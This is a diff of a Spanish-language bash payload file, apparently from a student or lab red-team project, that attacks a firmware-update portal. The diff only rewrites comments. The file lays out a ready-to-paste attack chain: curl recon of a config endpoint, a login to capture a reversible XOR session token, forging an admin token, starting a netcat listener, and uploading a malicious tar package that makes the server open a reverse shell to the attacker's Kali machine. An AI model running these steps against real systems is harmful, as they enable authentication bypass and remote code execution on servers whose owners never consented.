@@ -1,25 +1,25 @@
 #!/bin/bash
-# Payloads del proyecto - Portal de Gestion de Actualizaciones y Firmwares
-# Reemplaza <IP_VICTIMA> e <IP_KALI>.
+# Lista de los ataques del proyecto, listos para copiar y pegar.
+# Reemplaza <IP_VICTIMA> e <IP_KALI> con las IPs reales.
 VICTIMA="http://<IP_VICTIMA>:8080"
 KALI="<IP_KALI>"
 
-# ===================== A04: Fallas Criptográficas =====================
-# Recon: el endpoint filtra el esquema criptográfico
+# ===================== Falla de criptografía (A04) =====================
+# Pedimos la configuración, que nos revela cómo protege los tokens.
 curl -s "$VICTIMA/api/config"
 
-# Login usuario normal -> cookie con token XOR reversible
+# Entramos como usuario normal y vemos la cookie con el token que se puede modificar.
 curl -si -X POST "$VICTIMA/login" \
      -d "usuario=operador&password=operador123" | grep -i set-cookie
 
-# El descifrado XOR, la recuperación de la llave y la forja del token admin
-# se automatizan en red-team/exploit_a04.py
+# Recuperar la llave y armar el token de administrador se hace automático con
+# red-team/exploit_a04.py
 
-# ===================== A08: Fallas de Integridad ======================
-# 1. Listener en Kali:            nc -lvnp 4444
-# 2. Construir paquete malicioso: python3 red-team/paquete_malicioso_red_team
-# 3. Subir con el token admin forjado en el paso A04:
+# ===================== Falla de integridad (A08) ======================
+# 1. En Kali, dejamos escuchando:  nc -lvnp 4444
+# 2. Creamos el paquete dañino:     python3 red-team/paquete_malicioso_red_team
+# 3. Lo subimos usando el token de administrador del paso anterior:
 curl -s -X POST "$VICTIMA/upload-update" \
      -b "session=<TOKEN_ADMIN_FORJADO>" \
      -F "paquete=@out/malicious.tar"
-# -> el servidor ejecuta update.sh y abre una reverse shell hacia $KALI:4444
+# -> el servidor ejecuta update.sh y nos abre la shell hacia $KALI:4444
